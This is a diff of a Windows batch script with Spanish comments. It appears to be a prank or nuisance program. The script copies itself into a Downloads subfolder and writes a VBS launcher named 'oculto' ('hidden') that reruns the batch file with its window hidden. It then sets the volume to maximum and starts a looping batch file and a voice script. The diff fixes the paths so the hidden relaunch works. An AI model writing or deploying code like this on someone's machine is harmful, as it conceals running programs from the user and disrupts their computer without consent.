@@ -3,8 +3,8 @@ copy final.bat %userprofile%\Downloads\carpeta
 IF EXIST %userprofile%\Downloads\carpeta\oculto.vbs (
 goto :in
 )
-echo CreateObject("Wscript.Shell").Run "%userprofile%\Download\final.bat", 0, True > %userprofile%\Downloads\carpeta\oculto.vbs
-start oculto.vbs
+echo CreateObject("Wscript.Shell").Run "%userprofile%\Downloads\carpeta\final.bat", 0, True > %userprofile%\Downloads\carpeta\oculto.vbs
+start %userprofile%\Downloads\carpeta\oculto.vbs
 exit
 :in
 rem Subir volumen al maximo
@@ -36,9 +36,6 @@ rem Iniciar programas
 start %userprofile%\Downloads\carpeta\volumenmaximo.vbs
 start %userprofile%\Downloads\carpeta\bucle.bat
 start %userprofile%\Downloads\carpeta\voice.vbs
-
-
-
 
 
 
